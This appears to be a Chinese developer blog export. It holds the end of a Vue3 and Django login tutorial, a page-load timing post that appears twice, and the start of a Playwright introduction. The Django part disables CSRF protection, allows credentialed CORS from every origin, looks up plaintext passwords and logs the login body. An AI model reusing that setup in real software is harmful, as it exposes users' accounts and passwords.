<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">   	....</span><br><span class="line">    &#x27;TestModel&#x27;,  # 添加此项</span><br><span class="line">    &#x27;corsheaders&#x27;,  # 跨域</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">MIDDLEWARE = [</span><br><span class="line">    &#x27;django.middleware.security.SecurityMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,</span><br><span class="line">    # &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;,</span><br><span class="line">    # 加入这个</span><br><span class="line">    &#x27;corsheaders.middleware.CorsMiddleware&#x27;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#跨域增加忽略</span><br><span class="line">CORS_ALLOW_CREDENTIALS = True</span><br><span class="line">CORS_ORIGIN_ALLOW_ALL = True</span><br><span class="line">CORS_ORIGIN_WHITELIST = (</span><br><span class="line"> &#x27;http://localhost:5173&#x27;,</span><br><span class="line"> &#x27;http://127.0.0.1:5173&#x27;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">CORS_ALLOW_METHODS = (</span><br><span class="line"> &#x27;DELETE&#x27;,</span><br><span class="line"> &#x27;GET&#x27;,</span><br><span class="line"> &#x27;OPTIONS&#x27;,</span><br><span class="line"> &#x27;PATCH&#x27;,</span><br><span class="line"> &#x27;POST&#x27;,</span><br><span class="line"> &#x27;PUT&#x27;,</span><br><span class="line"> &#x27;VIEW&#x27;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">CORS_ALLOW_HEADERS = (</span><br><span class="line"> &#x27;XMLHttpRequest&#x27;,</span><br><span class="line"> &#x27;X_FILENAME&#x27;,</span><br><span class="line"> &#x27;accept-encoding&#x27;,</span><br><span class="line"> &#x27;authorization&#x27;,</span><br><span class="line"> &#x27;content-type&#x27;,</span><br><span class="line"> &#x27;dnt&#x27;,</span><br><span class="line"> &#x27;origin&#x27;,</span><br><span class="line"> &#x27;user-agent&#x27;,</span><br><span class="line"> &#x27;x-csrftoken&#x27;,</span><br><span class="line"> &#x27;x-requested-with&#x27;,</span><br><span class="line"> &#x27;Pragma&#x27;,</span><br><span class="line">&#x27;json&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>登录代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def user_login(request):</span><br><span class="line">    if request.method != &quot;POST&quot;:</span><br><span class="line">        return JsonResponse(&#123;&#x27;code&#x27;: -1, &#x27;msg&#x27;: &#x27;method must is POST&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">    data = json.loads(request.body)</span><br><span class="line">    user_name = data.get(&#x27;username&#x27;)</span><br><span class="line">    pwd = data.get(&quot;password&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">    try:</span><br><span class="line">        user_entry = Users.objects.get(name=user_name, pwd=pwd)</span><br><span class="line">        if user_entry:</span><br><span class="line">            # 设置登录的session</span><br><span class="line">            request.session[&quot;user&quot;] = user_name</span><br><span class="line">            return JsonResponse(&#123;&#x27;code&#x27;: 1, &#x27;msg&#x27;: &#x27;login is success&#x27;&#125;)</span><br><span class="line">        else:</span><br><span class="line">            return JsonResponse(&#123;&#x27;code&#x27;: -1, &#x27;msg&#x27;: &#x27;login is fail221&#x27;&#125;)</span><br><span class="line">    except ObjectDoesNotExist:</span><br><span class="line">        return JsonResponse(&#123;&#x27;code&#x27;: -1, &#x27;msg&#x27;: &#x27;login is fail111&#x27;&#125;)</span><br></pre></td></tr></table></figure>

<ul>
<li>运行代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm run dev</span><br><span class="line"></span><br><span class="line">&gt; vue-project@0.0.0 dev</span><br><span class="line">&gt; vite</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/b435d821/image-20230808190806334.png" alt="image-20230808190806334"></p>
<ul>
<li>输入用户名和密码登录成功后，跳转到了home页面</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>本次用的setup，和vue2.0 区别比较大，比如调用方法不在放到method中</p>
</li>
<li><p>解决了vue和django 交互的跨域问题</p>
</li>
<li><p>自定义路由</p>
</li>
<li><p>封装<code>axios</code></p>
</li>
<li><p>客户端一定要用127.0.0.1 访问，需要和django中设置的白名单ip保持一致</p>
</li>
</ul>
]]></content>
      <categories>
        <category>vue3</category>
      </categories>
      <tags>
        <tag>vue3</tag>
      </tags>
  </entry>
  <entry>
    <title>web 与移动端 h5 页面加载时间分析</title>
    <url>/aposts/98c8b172/</url>
    <content><![CDATA[<h1 id="chrome浏览器的开发工具network"><a href="#chrome浏览器的开发工具network" class="headerlink" title="chrome浏览器的开发工具network"></a>chrome浏览器的开发工具network</h1><p><img src="/aposts/98c8b172/image-20220427160911385.png" alt="image-20220427160911385"></p>
<h2 id="Finish-DOMLoaded和Load的区别"><a href="#Finish-DOMLoaded和Load的区别" class="headerlink" title="Finish,DOMLoaded和Load的区别"></a>Finish,DOMLoaded和Load的区别</h2><h3 id="DOMLoaded和Load"><a href="#DOMLoaded和Load" class="headerlink" title="DOMLoaded和Load"></a><code>DOMLoaded</code>和<code>Load</code></h3><ul>
<li><code>DOMContentLoaded</code> 和<code> Load</code> 分别对应 页面 <code>DOMContentLoaded</code> 和 <code>Load</code> 事件触发的时间点</li>
<li><code>DOMContentLoaded</code>：<code>DOM</code>树构建完成。即<code>HTML</code>页面由上向下解析<code>HTML</code>结构到末尾封闭标签<code>&lt;/html&gt;</code> 。</li>
<li><code> Load</code>:页面加载完毕。 <code>DOM</code>树构建完成后，继续加载<code>html/css</code> 中的图片资源等外部资源，加载完成后视为页面加载完毕。</li>
<li><code>DOMContentLoaded</code> 会比 <code>Load</code> 时间小，两者时间差大致等于外部资源加载的时间。<br>看看下面这个例子：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script src=1.js&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=2.js&gt;&lt;/script&gt;</span><br><span class="line">&lt;img src=1.jpg /&gt;</span><br><span class="line">&lt;script src=3.js&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>3.js</code> 执行（不包括异步部分）后，后面的<code> html</code> 才能允许渲染， <code>DOMContentLoaded</code> 应该是指  最后一个字节都被渲染出来后的时间 (<code>onDocumentChange</code> 状态变成 <code>ready</code> ）。而 <code>onLoad</code> 的触发除了<code>dom</code>还包括所有依赖元素，上例中就是要等 <code>1.jpg</code> 加载完成（或出错）后才能触发</li>
</ul>
<h3 id="看下Finish"><a href="#看下Finish" class="headerlink" title="看下Finish"></a>看下<code>Finish</code></h3><ul>
<li><code>Chrome devtools</code>中的<code>Finish</code>时间似乎包括页面上的异步加载（非阻塞）对象&#x2F;元素，这些对象&#x2F;元素可能会在页面的<code>onload</code>事件触发后继续下载。</li>
<li>一般来说，网站的响应时间意味着<code>Load</code>时间，因为用户可以更容易地感知到这一点，此时用户可以看到浏览器已完成工作并且页面已准备就绪。</li>
<li>在某些情况下，似乎<code>Finish</code>永远不会停止并继续增加，因此它可能不是对网页响应时间的最佳评估。</li>
<li>经过测试会出现会出现<code>Finish</code> 的时间比 <code>Load</code> 大也有可能小，引用于<a href="https://segmentfault.com/q/1010000011840948">这篇文章</a><blockquote>
<p>Finish 时间与DOMContentLoaded 和 Load 并无直接关系。<br>Finish 时间是页面上所有 http 请求发送到响应完成的时间，HTTP1.0&#x2F;1.1 协议限定，单个域名的请求并发量是 6 个，即Finish是所有请求（不只是XHR请求，还包括DOC，img，js，css等资源的请求）在并发量为6的限制下完成的时间。<br>Finish 的时间比 Load 大，意味着页面有相当部分的请求量，<br>Finish 的时间比 Load 小，意味着页面请求量很少，如果页面是只有一个 html文档请求的静态页面，Finish时间基本就等于HTML文档请求的时间<br>页面发送请求和页面解析文档结构，分属两个不同的线程，</p>
</blockquote>
</li>
</ul>
<h2 id="实践列子"><a href="#实践列子" class="headerlink" title="实践列子"></a>实践列子</h2><ul>
<li>看看官网的例子<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import PyChromeDevTools</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">os.chdir(r&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\Application&quot;)</span><br><span class="line">cmd = &quot;chrome.exe --remote-debugging-port=9222&quot;</span><br><span class="line">os.popen(cmd)</span><br><span class="line">chrome = PyChromeDevTools.ChromeInterface()</span><br><span class="line">chrome.Network.enable()</span><br><span class="line">chrome.Page.enable()</span><br><span class="line">chrome.Page.reload(ignoreCache=True) # 不带缓存</span><br><span class="line">start_time=time.time()</span><br><span class="line">chrome.Page.navigate(url=&quot;http://www.baidu.com/&quot;)</span><br><span class="line">chrome.wait_event(&quot;Page.loadEventFired&quot;, timeout=60)</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(&quot;Page Loading Time:&quot;, end_time-start_time)</span><br><span class="line">chrome.close()</span><br></pre></td></tr></table></figure></li>
</ul>
<p>得到结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Page Loading Time: 1.702894687652588</span><br><span class="line">Page Loading Time: 1.658094882965088</span><br><span class="line">Page Loading Time: 1.5752882957458496</span><br></pre></td></tr></table></figure>

<p>在chrome浏览器的console下调试，基本上和<code>load</code>时间一致：<br><img src="/aposts/98c8b172/image-20220427160947950.png" alt="image-20220427160947950"></p>
<h2 id="在chrome-浏览器里调试"><a href="#在chrome-浏览器里调试" class="headerlink" title="在chrome 浏览器里调试"></a>在chrome 浏览器里调试</h2><ul>
<li>在<code>Console</code>输入 <code>window.performance.getEntries()</code>,可以看到页面上所有的资源请求，不统计404的请求<br><img src="/aposts/98c8b172/image-20220427161012309.png" alt="image-20220427161012309"></li>
<li>有65个请求，里面有请求的哪个节点耗时，和url，查看第一个请求<code>duration</code>其实就是页面的<code>load</code>时间</li>
</ul>
<p><img src="/aposts/98c8b172/image-20220427161048311-16510470495321.png" alt="image-20220427161048311"></p>
<p><img src="/aposts/98c8b172/image-20220427161108589.png" alt="image-20220427161108589"></p>
<ul>
<li>想过把这所有资源的<code>duration</code>相加应该就能得到<code>Finish</code>时间?,经过测试，当然是不行的，第一个请求<code>duration</code>虽然是页面的<code>load</code>时间，但是它可能包含了页面上的非异步的请求，同时也包含了<code>css</code>,<code>img</code>,<code>dom</code>的加载时间,因此相加统计肯定会被<code>Finish</code>要大</li>
</ul>
<h2 id="关于自动化"><a href="#关于自动化" class="headerlink" title="关于自动化"></a>关于自动化</h2><ul>
<li>可以结合selenium来使用<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">import os</span><br><span class="line">PATH = lambda p: os.path.abspath(</span><br><span class="line">    os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">)</span><br><span class="line">chrome_driver = PATH(&quot;exe/chromedriver.exe&quot;)</span><br><span class="line">os.environ[&quot;webdriver.chrome.driver&quot;] = chrome_driver</span><br><span class="line">driver = webdriver.Chrome(chrome_driver)</span><br><span class="line">driver.get(&quot;http://www.baidu.com&quot;)</span><br><span class="line">data = driver.execute_script(&quot;return window.performance.getEntries();&quot;)</span><br><span class="line">print(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="移动端h5性能测试"><a href="#移动端h5性能测试" class="headerlink" title="移动端h5性能测试"></a>移动端h5性能测试</h2><ul>
<li>打开手机usb调试</li>
<li>如果是想调试混合app的webview,请打开：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT) &#123;</span><br><span class="line">MtcWebView.setWebContentsDebuggingEnabled(true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>手机连接电脑后，打开chrome,输入chrome:&#x2F;&#x2F;inspect&#x2F;#devices</li>
<li>然后就可以进行调试了</li>
</ul>
<p><img src="/aposts/98c8b172/image-20220427161218594.png" alt="image-20220427161218594"></p>
<p><img src="/aposts/98c8b172/image-20220427161238398.png" alt="image-20220427161238398"></p>
<p><img src="/aposts/98c8b172/image-20220427161255522.png" alt="image-20220427161255522"></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://segmentfault.com/a/1190000004010453?utm_medium=referral&utm_source=tuicool">使用性能API快速分析web前端性能</a></li>
</ul>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>web-与移动端-h5-页面加载时间分析</title>
    <url>/aposts/33eb5b1a/</url>
    <content><![CDATA[<ul>
<li>打开chrome浏览器的调试工具，如图所示：</li>
</ul>
<p><img src="/aposts/33eb5b1a/2231755-c61ed874cdb149a6.png" alt="image.png"></p>
<h2 id="主要看下这里的Finish-DOMLoaded和Load的区别"><a href="#主要看下这里的Finish-DOMLoaded和Load的区别" class="headerlink" title="主要看下这里的Finish,DOMLoaded和Load的区别"></a>主要看下这里的<code>Finish</code>,<code>DOMLoaded</code>和<code>Load</code>的区别</h2><h3 id="DOMLoaded和Load"><a href="#DOMLoaded和Load" class="headerlink" title="DOMLoaded和Load"></a><code>DOMLoaded</code>和<code>Load</code></h3><ul>
<li><code>DOMContentLoaded</code> 和<code> Load</code> 分别对应 页面 <code>DOMContentLoaded</code> 和 <code>Load</code> 事件触发的时间点</li>
<li><code>DOMContentLoaded</code>：<code>DOM</code>树构建完成。即<code>HTML</code>页面由上向下解析<code>HTML</code>结构到末尾封闭标签<code>&lt;/html&gt;</code> 。</li>
<li><code> Load</code>:页面加载完毕。 <code>DOM</code>树构建完成后，继续加载<code>html/css</code> 中的图片资源等外部资源，加载完成后视为页面加载完毕。</li>
<li><code>DOMContentLoaded</code> 会比 <code>Load</code> 时间小，两者时间差大致等于外部资源加载的时间。<br>看看下面这个例子：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script src=1.js&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=2.js&gt;&lt;/script&gt;</span><br><span class="line">&lt;img src=1.jpg /&gt;</span><br><span class="line">&lt;script src=3.js&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>3.js</code> 执行（不包括异步部分）后，后面的<code> html</code> 才能允许渲染， <code>DOMContentLoaded</code> 应该是指  最后一个字节都被渲染出来后的时间 (<code>onDocumentChange</code> 状态变成 <code>ready</code> ）。而 <code>onLoad</code> 的触发除了<code>dom</code>还包括所有依赖元素，上例中就是要等 <code>1.jpg</code> 加载完成（或出错）后才能触发</li>
</ul>
<h3 id="看下Finish"><a href="#看下Finish" class="headerlink" title="看下Finish"></a>看下<code>Finish</code></h3><ul>
<li><code>Chrome devtools</code>中的<code>Finish</code>时间似乎包括页面上的异步加载（非阻塞）对象&#x2F;元素，这些对象&#x2F;元素可能会在页面的<code>onload</code>事件触发后继续下载。</li>
<li>一般来说，网站的响应时间意味着<code>Load</code>时间，因为用户可以更容易地感知到这一点，此时用户可以看到浏览器已完成工作并且页面已准备就绪。</li>
<li>在某些情况下，似乎<code>Finish</code>永远不会停止并继续增加，因此它可能不是对网页响应时间的最佳评估。</li>
<li>经过测试会出现会出现<code>Finish</code> 的时间比 <code>Load</code> 大也有可能小，引用于<a href="https://segmentfault.com/q/1010000011840948">这篇文章</a><blockquote>
<p>Finish 时间与DOMContentLoaded 和 Load 并无直接关系。<br>Finish 时间是页面上所有 http 请求发送到响应完成的时间，HTTP1.0&#x2F;1.1 协议限定，单个域名的请求并发量是 6 个，即Finish是所有请求（不只是XHR请求，还包括DOC，img，js，css等资源的请求）在并发量为6的限制下完成的时间。<br>Finish 的时间比 Load 大，意味着页面有相当部分的请求量，<br>Finish 的时间比 Load 小，意味着页面请求量很少，如果页面是只有一个 html文档请求的静态页面，Finish时间基本就等于HTML文档请求的时间<br>页面发送请求和页面解析文档结构，分属两个不同的线程，</p>
</blockquote>
</li>
</ul>
<h2 id="实践列子"><a href="#实践列子" class="headerlink" title="实践列子"></a>实践列子</h2><ul>
<li>看看官网的例子<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import PyChromeDevTools</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">os.chdir(r&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\Application&quot;)</span><br><span class="line">cmd = &quot;chrome.exe --remote-debugging-port=9222&quot;</span><br><span class="line">os.popen(cmd)</span><br><span class="line">chrome = PyChromeDevTools.ChromeInterface()</span><br><span class="line">chrome.Network.enable()</span><br><span class="line">chrome.Page.enable()</span><br><span class="line">chrome.Page.reload(ignoreCache=True) # 不带缓存</span><br><span class="line">start_time=time.time()</span><br><span class="line">chrome.Page.navigate(url=&quot;http://www.baidu.com/&quot;)</span><br><span class="line">chrome.wait_event(&quot;Page.loadEventFired&quot;, timeout=60)</span><br><span class="line">end_time = time.time()</span><br><span class="line">print(&quot;Page Loading Time:&quot;, end_time-start_time)</span><br><span class="line">chrome.close()</span><br></pre></td></tr></table></figure></li>
</ul>
<p>得到结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Page Loading Time: 1.702894687652588</span><br><span class="line">Page Loading Time: 1.658094882965088</span><br><span class="line">Page Loading Time: 1.5752882957458496</span><br></pre></td></tr></table></figure>

<p>在chrome浏览器的console下调试，基本上和load时间一致：<br><img src="/aposts/33eb5b1a/2231755-d85861f10e0a2940.png" alt="image.png"></p>
<h2 id="在chrome-浏览器里调试"><a href="#在chrome-浏览器里调试" class="headerlink" title="在chrome 浏览器里调试"></a>在chrome 浏览器里调试</h2><ul>
<li><p>在<code>Console</code>输入 <code>window.performance.getEntries()</code>,可以看到页面上所有的资源请求，不统计404的请求<br><img src="/aposts/33eb5b1a/2231755-3835f84a79aea6b3.png" alt="image.png"></p>
</li>
<li><p>有65个请求，里面有请求的哪个节点耗时，和url，查看第一个请求<code>duration</code>其实就是页面的<code>load</code>时间<br><img src="/aposts/33eb5b1a/2231755-fdffe1000ade2f4e.png" alt="image.png"><br><img src="/aposts/33eb5b1a/2231755-66979b0789c054a3.png" alt="image.png"></p>
</li>
<li><p>想过把这所有资源的<code>duration</code>相加应该就能得到<code>Finish</code>时间?,经过测试，当然是不行的，第一个请求<code>duration</code>虽然是页面的<code>load</code>时间，但是它可能包含了页面上的非异步的请求，同时也包含了<code>css</code>,<code>img</code>,<code>dom</code>的加载时间,因此相加统计肯定会被<code>Finish</code>要大</p>
</li>
</ul>
<h2 id="关于自动化"><a href="#关于自动化" class="headerlink" title="关于自动化"></a>关于自动化</h2><ul>
<li>可以结合selenium来使用<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">import os</span><br><span class="line">PATH = lambda p: os.path.abspath(</span><br><span class="line">    os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">)</span><br><span class="line">chrome_driver = PATH(&quot;exe/chromedriver.exe&quot;)</span><br><span class="line">os.environ[&quot;webdriver.chrome.driver&quot;] = chrome_driver</span><br><span class="line">driver = webdriver.Chrome(chrome_driver)</span><br><span class="line">driver.get(&quot;http://www.baidu.com&quot;)</span><br><span class="line">data = driver.execute_script(&quot;return window.performance.getEntries();&quot;)</span><br><span class="line">print(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="移动端h5性能测试"><a href="#移动端h5性能测试" class="headerlink" title="移动端h5性能测试"></a>移动端h5性能测试</h2><ul>
<li>打开手机usb调试</li>
<li>如果是想调试混合app的webview,请打开：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT) &#123;</span><br><span class="line">MtcWebView.setWebContentsDebuggingEnabled(true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>手机连接电脑后，打开chrome,输入chrome:&#x2F;&#x2F;inspect&#x2F;#devices</li>
<li>然后就可以进行调试了<br><img src="/aposts/33eb5b1a/2231755-ccd91e31dd0295a5.png" alt="image.png"></li>
</ul>
<p><img src="/aposts/33eb5b1a/2231755-95375500467c829c.png" alt="image.png"><br><img src="/aposts/33eb5b1a/2231755-1a229e3b57374378.png" alt="image.png"></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://segmentfault.com/a/1190000004010453?utm_medium=referral&utm_source=tuicool">使用性能API快速分析web前端性能</a></li>
</ul>
]]></content>
      <categories>
        <category>Android测试</category>
      </categories>
      <tags>
        <tag>H5</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>web自动化神器playwright</title>
    <url>/aposts/b0b7e6c8/</url>
    <content><![CDATA[<h1 id="playwright"><a href="#playwright" class="headerlink" title="playwright"></a>playwright</h1><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul>
<li><p>Selenium需要通过WebDriver操作浏览器；Playwright通过开发者工具与浏览器交互，安装简洁，不需要安装各种Driver。</p>
</li>
<li><p>Playwright几乎支持所有语言，且不依赖于各种Driver，通过调用内置浏览器所以启动速度更快。</p>
</li>
<li><p>Selenium基于HTTP协议（单向通讯），Playwright基于Websocket（双向通讯）可自动获取浏览器实际情况。</p>
</li>
<li><p>比如使用selenium时，操作元素需要对每个元素进行智能查询等待等，而Playwright为自动等待：</p>
</li>
<li><ul>
<li>等待元素出现（定位元素时，自动等待30s，时间可以自定义，单位毫秒）</li>
<li>等待事件发生</li>
</ul>
</li>
<li><p>Playwright速度比selenium快很多，还支持异步方式</p>
</li>
<li><p>支持使用API的方式发送请求</p>
</li>
</ul>
<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><ul>
<li>不支持旧版Edge和IE11。Playwright不支持传统的Microsoft Edge或IE11，支持新的Microsoft Edge (在Chromium上)。</li>
<li>在真实移动设备上测试: Playwright使用桌面浏览器来模拟移动设备。</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#升级pip</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">#安装playwright模块</span><br><span class="line">pip install playwright</span><br><span class="line">#安装主流浏览器依赖,时间可能较久</span><br><span class="line">playwright install</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
<li>录制代码，输入下面的命令，启动一个浏览器，一个代码记录器，然后再浏览器的所有步骤都自动记录到了代码记录器中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m playwright codegen</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/b0b7e6c8/image-20221011105539960.png" alt="image-20221011105539960"></p>
<ul>
<li>录制代码如下</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> Playwright, sync_playwright, expect</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">playwright: Playwright</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    browser = playwright.chromium.launch(headless=<span class="literal">False</span>)</span><br><span class="line">    context = browser.new_context()</span><br><span class="line">    page = context.new_page()</span><br><span class="line">    page.goto(<span class="string">&quot;https://www.baidu.com/&quot;</span>)</span><br><span class="line">    page.locator(<span class="string">&quot;input[name=\&quot;wd\&quot;]&quot;</span>).click()</span><br><span class="line">    page.locator(<span class="string">&quot;input[name=\&quot;wd\&quot;]&quot;</span>).fill(<span class="string">&quot;python&quot;</span>)</span><br><span class="line">    page.get_by_role(<span class="string">&quot;button&quot;</span>, name=<span class="string">&quot;百度一下&quot;</span>).click()</span><br><span class="line">    page.wait_for_url(<span class="string">&quot;https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=python&amp;fenlei=256&amp;rsv_pq=0xc3da98d700012600&amp;rsv_t=a363ozUooWOMdrOI3S3PH3JauszohenVsQYNmRX6SyweDX91MOi0p89Sb4HG&amp;rqlang=en&amp;rsv_enter=0&amp;rsv_dl=tb&amp;rsv_sug3=6&amp;rsv_sug1=1&amp;rsv_sug7=100&amp;rsv_btype=i&amp;inputT=1846&amp;rsv_sug4=1847&amp;rsv_jmp=fail&quot;</span>)</span><br><span class="line">    <span class="comment"># ---------------------</span></span><br><span class="line">    context.close()</span><br><span class="line">    browser.close()</span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> playwright:</span><br><span class="line">    run(playwright)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过以上代码可以了解到：</p>
<ul>
<li><p>playwright支持同步和异步两种使用方法</p>
</li>
<li><p>不需要为每个浏览器下载webdriver</p>
</li>
<li><p>相比selenium多了一层context抽象</p>
</li>
<li><p>支持无头浏览器，且较为推荐（headless默认值为True）</p>
</li>
<li><p>可以使用传统定位方式（CSS，XPATH等），也有自定义的新的定位方式（如文字定位）</p>
</li>
<li><p>没有使用selenium的先定位元素，再进行操作的方式，而是在操作方法中传入了元素定位，定位和操作同时进行（其实也playwright也提供了单独的定位方法，作为可选）</p>
</li>
<li><p>很多方法使用了with的上下文语法</p>
</li>
<li><p>当然更多的人愿意在Pycharm中手写用例</p>
</li>
</ul>
<h2 id="playwright基本概念"><a href="#playwright基本概念" class="headerlink" title="playwright基本概念"></a>playwright基本概念</h2><ul>
<li>来做<a href="https://blog.csdn.net/Code_LT/article/details/120291277?spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-5-120291277-blog-125575408.t0_edu_mix&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-5-120291277-blog-125575408.t0_edu_mix&utm_relevant_index=6">这里</a></li>
</ul>
<p>PlayWright的核心概念包括：</p>
<ul>
<li><a href="https://playwright.dev/python/docs/core-concepts#browser">Browser</a></li>
<li><a href="https://playwright.dev/python/docs/core-concepts#browser-contexts">Browser contexts</a></li>
<li><a href="https://playwright.dev/python/docs/core-concepts#pages-and-frames">Pages and frames</a></li>
<li><a href="https://playwright.dev/python/docs/core-concepts#selectors">Selectors</a></li>
<li><a href="https://playwright.dev/python/docs/core-concepts#auto-waiting">Auto-waiting</a></li>
<li><a href="https://playwright.dev/python/docs/core-concepts#execution-contexts-playwright-and-browser">Execution contexts: Playwright and Browser</a></li>
<li><a href="https://playwright.dev/python/docs/core-concepts#evaluation-argument">Evaluation Argument</a></li>
</ul>
<h3 id="Browser"><a href="#Browser" class="headerlink" title="Browser"></a>Browser</h3><ul>
<li>一个Browser是一个Chromium, Firefox 或 WebKit（plarywright支持的三种浏览器）的实例plarywright脚本通常以启动浏览器实例开始，以关闭浏览器结束。浏览器实例可以在headless（没有 GUI）或head模式下启动。Browser实例创建：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">    browser = p.chromium.launch(headless=<span class="literal">False</span>)</span><br><span class="line">    browser.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>启动browser实例是比较耗费资源的，plarywright做的就是如何通过一个browser实例最大化多个BrowserContext的性能。</li>
<li>API:<a href="https://playwright.dev/python/docs/api/class-browser">Browser</a></li>
</ul>
<h3 id="BrowserContext"><a href="#BrowserContext" class="headerlink" title="BrowserContext"></a>BrowserContext</h3><ul>
<li><p>一个BrowserContex就像是一个独立的匿名模式会话（session），非常轻量，但是又完全隔离。</p>
</li>
<li><p>（译者注：每个browser实例可有多个BrowserContex，且完全隔离。比如可以在两个BrowserContext中登录两个不同的账号，也可以在两个 context 中使用不同的代理。 ）</p>
</li>
<li><p>context创建：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">browser = playwright.chromium.launch()</span><br><span class="line">context = browser.new_context()</span><br></pre></td></tr></table></figure>

<ul>
<li>context还可用于模拟涉及移动设备、权限、区域设置和配色方案的多页面场景，如移动端context创建：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">    iphone_11 = p.devices[<span class="string">&#x27;iPhone 11 Pro&#x27;</span>]</span><br><span class="line">    browser = p.webkit.launch(headless=<span class="literal">False</span>)</span><br><span class="line">    context = browser.new_context(</span><br><span class="line">        **iphone_11,</span><br><span class="line">        locale=<span class="string">&#x27;de-DE&#x27;</span>,</span><br><span class="line">        geolocation=&#123; <span class="string">&#x27;longitude&#x27;</span>: <span class="number">12.492507</span>, <span class="string">&#x27;latitude&#x27;</span>: <span class="number">41.889938</span> &#125;,</span><br><span class="line">        permissions=[<span class="string">&#x27;geolocation&#x27;</span>]</span><br><span class="line">    )</span><br><span class="line">    browser.close()</span><br></pre></td></tr></table></figure>

<p>API:</p>
<ul>
<li><a href="https://playwright.dev/python/docs/api/class-browsercontext">BrowserContext</a></li>
